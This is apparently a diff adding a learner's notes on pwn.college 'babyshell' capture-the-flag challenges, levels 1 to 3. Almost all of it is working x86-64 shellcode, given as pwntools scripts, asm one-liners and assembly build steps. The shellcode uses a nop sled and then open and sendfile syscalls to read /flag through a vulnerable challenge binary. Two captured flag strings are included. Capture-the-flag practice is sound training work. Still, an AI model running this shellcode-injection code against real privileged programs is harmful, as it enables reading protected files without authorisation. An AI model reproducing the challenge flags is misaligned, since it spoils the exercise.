@@ -1,1 +1,272 @@
+//all the 3 solution boilerplates do the same thing for both level 1 and level 2.
+//they are all used to send our code to the /challenge/.... input
+                
+Alternative way to solve level 2. But can also be used to solve other shellcoding problems
+Step 1: type vi shellcode.s
+Step 2: add the below content inside it
+.global _start
+_start:
+.intel_syntax noprefix
+   .rept 0x800
+          nop
+   .endr
+   mov rbx, 0x00000067616c662f
+   push rbx
+   mov rax, 2
+   mov rdi, rsp
+   mov rsi, 0
+   syscall
+
+   mov rdi, 1
+   mov rsi, rax
+   mov rdx, 0
+   mov r10, 1000
+   mov rax, 40
+   syscall
+
+   mov rax, 60
+   syscall
+Step 3: type in terminal: gcc -nostdlib -static shellcode.s -o shellcode-elf
+       then write in terminal: objcopy --dump-section .text=shellcode-raw shellcode-elf
+step 4: cat shellcode-raw | /challenge/babyshell_level2
+Optional step:-type: strace ./shellcode-elf
+        -shows you what is happening in the high-level inside your code.
+Optional step:
+
+ 
+
+
+
+
+
+             level 1- solution1
+//a hex converter to convert words to hex: https://www.online-toolz.com/tools/text-hex-convertor.php
+//values from a syscall will always be stored in rax
+Step1: type 'vi babyshell.py'
+
+Step2: Add the below content inside the above file
+from pwn import *
+
+sys.stdout.buffer.write(asm("""
+   mov rbx, 0x00000067616c662f # push "/flag" filename
+   push rbx
+   mov rax, 2 # syscall number of open
+   mov rdi, rsp # point the first argument at stack (where we have "/flag")
+   mov rsi, 0 # NULL out the second argument (meaning, O_RDONLY)
+   syscall # trigger open("/flag", NULL)
+
+   mov rdi, 1 # first argument to sendfile is the file descriptor to output to (stdout)
+   mov rsi, rax # second argument is the file descriptor returned by open
+   mov rdx, 0 # third argument is the number of bytes to skip from the input file
+   mov r10, 1000 # fourth argument is the number of bytes to transfer to the output file
+   mov rax, 40 # syscall number of sendfile
+   syscall # trigger sendfile(1, fd, 0, 1000)
+   
+   mov rax, 60 # syscall number of exit
+   syscall # trigger exit()
+""", arch="amd64", os="linux"))
+
+Step 3: type 'python3 babyshell.py | /challenge/babyshell_level1' in terminal
+
+
+                     
+               level 1-solution2
+asm -c amd64 " 
+
+   mov rbx, 0x00000067616c662f
+   push rbx
+   mov rax, 2
+   mov rdi, rsp
+   mov rsi, 0
+   syscall
+
+   mov rdi, 1
+   mov rsi, rax
+   mov rdx, 0
+   mov r10, 1000
+   mov rax, 40 
+   syscall 
+   
+   mov rax, 60
+   syscall" | /challenge/babyshell_level2
+
+
+
+               level 1-solution3
+from pwn import *
+
+# set some context
+context.arch = "amd64"
+context.encoding = "latin"
+# ignore warnings
+warnings.simplefilter("ignore")
+
+# assembly goes here, most of the rest is boilerplate
+assembly = """
+.rept 0x800
+          nop
+   .endr
+   mov rbx, 0x00000067616c662f
+   push rbx
+   mov rax, 2
+   mov rdi, rsp
+   mov rsi, 0
+   syscall
+
+   mov rdi, 1
+   mov rsi, rax
+   mov rdx, 0
+   mov r10, 1000
+   mov rax, 40 
+   syscall 
+   
+   mov rax, 60
+   syscall
+"""
+
+# the hostname will always be the same as challenge binary
+with process(f"/challenge/{os.getenv('HOSTNAME')}") as target:
+    info( target.readrepeat(1) )
+    target.send( asm(assembly) )
+    info( target.readrepeat(1) )
+
+
+Flag= pwn.college{oSDVNlcC3mmEhwfJdyZiRyqNkpq.QX3EjMsADOzQzW}
+
+
+
+               level 2- solution1
+//just add  0x800 bytes of 
+Step1: type 'vi babyshell.py'
+
+Step2: Add the below content inside the above file
+from pwn import *
+
+sys.stdout.buffer.write(asm("""
+   .rept 0x800
+                nop
+   .endr
+   mov rbx, 0x00000067616c662f # push "/flag" filename
+   push rbx
+   mov rax, 2 # syscall number of open
+   mov rdi, rsp # point the first argument at stack (where we have "/flag")
+   mov rsi, 0 # NULL out the second argument (meaning, O_RDONLY)
+   syscall # trigger open("/flag", NULL)
+
+   mov rdi, 1 # first argument to sendfile is the file descriptor to output to (stdout)
+   mov rsi, rax # second argument is the file descriptor returned by open
+   mov rdx, 0 # third argument is the number of bytes to skip from the input file
+   mov r10, 1000 # fourth argument is the number of bytes to transfer to the output file
+   mov rax, 40 # syscall number of sendfile
+   syscall # trigger sendfile(1, fd, 0, 1000)
+   
+   mov rax, 60 # syscall number of exit
+   syscall # trigger exit()
+""", arch="amd64", os="linux"))
+
+Step 3: type 'python3 babyshell.py | /challenge/babyshell_level1' in terminal
+
+                level 2-solution2
+asm -c amd64 " 
+   .rept 0x800
+          nop
+   .endr
+   mov rbx, 0x00000067616c662f
+   push rbx
+   mov rax, 2
+   mov rdi, rsp
+   mov rsi, 0
+   syscall
+
+   mov rdi, 1
+   mov rsi, rax
+   mov rdx, 0
+   mov r10, 1000
+   mov rax, 40 
+   syscall 
+   
+   mov rax, 60
+   syscall" | /challenge/babyshell_level2
+
+
+
+                    level 2-solution3
+from pwn import *
+
+# set some context
+context.arch = "amd64"
+context.encoding = "latin"
+# ignore warnings
+warnings.simplefilter("ignore")
+
+# assembly goes here, most of the rest is boilerplate
+assembly = """
+.rept 0x800
+          nop
+   .endr
+   mov rbx, 0x00000067616c662f
+   push rbx
+   mov rax, 2
+   mov rdi, rsp
+   mov rsi, 0
+   syscall
+
+   mov rdi, 1
+   mov rsi, rax
+   mov rdx, 0
+   mov r10, 1000
+   mov rax, 40 
+   syscall 
+   
+   mov rax, 60
+   syscall
+"""
+
+# the hostname will always be the same as challenge binary
+with process(f"/challenge/{os.getenv('HOSTNAME')}") as target:
+    info( target.readrepeat(1) )
+    target.send( asm(assembly) )
+    info( target.readrepeat(1) )
+
+flag=pwn.college{gDBurPf4kUtqmbvJjYddeAa2cDA.QX4EjMsADOzQzW}
+
+               
+               level 3
+from pwn import *
+
+# set some context
+context.arch = "amd64"
+context.encoding = "latin"
+# ignore warnings
+warnings.simplefilter("ignore")
+
+# assembly goes here, most of the rest is boilerplate
+assembly = """
+
+   mov rbx, 0x00000067616c662f
+   push rbx
+   mov rax, 2
+   mov rdi, rsp
+   mov rsi, 0
+   syscall
+
+   mov rdi, 1
+   mov rsi, rax
+   mov rdx, 0
+   mov r10, 1000
+   mov rax, 40 
+   syscall 
+   
+   mov rax, 60
+   syscall
+"""
+
+# the hostname will always be the same as challenge binary
+with process(f"/challenge/{os.getenv('HOSTNAME')}") as target:
+    info( target.readrepeat(1) )
+    target.send( asm(assembly) )
+    info( target.readrepeat(1) )
+
+
+
 
